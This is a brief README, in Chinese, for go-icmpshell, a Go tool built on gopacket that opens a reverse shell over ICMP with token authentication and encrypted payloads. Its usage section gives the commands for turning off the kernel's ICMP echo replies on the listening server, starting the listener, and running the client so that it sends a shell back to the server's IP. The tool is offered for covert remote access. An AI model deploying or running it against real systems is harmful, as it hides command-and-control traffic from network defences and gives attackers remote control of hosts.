# go-icmpshell
一款基于 `gopacket` 编写的 ICMP 反弹 shell 工具

## Features
- 支持自定义 ICMP 通信 id
- 基于 `token` 进行协商认证
- 针对传输载荷进行有效加密

## Usage
Server 端禁用 ICMP 自动 Reply
```shell
echo "1" >  /proc/sys/net/ipv4/icmp_echo_ignore_all
```

Server 端启动监听
```shell
./server --token [secret]
```

Shell 端通过 ICMP 反弹 Shell
```shell
./shell --token [secret] --ip [server_ip_address]
```
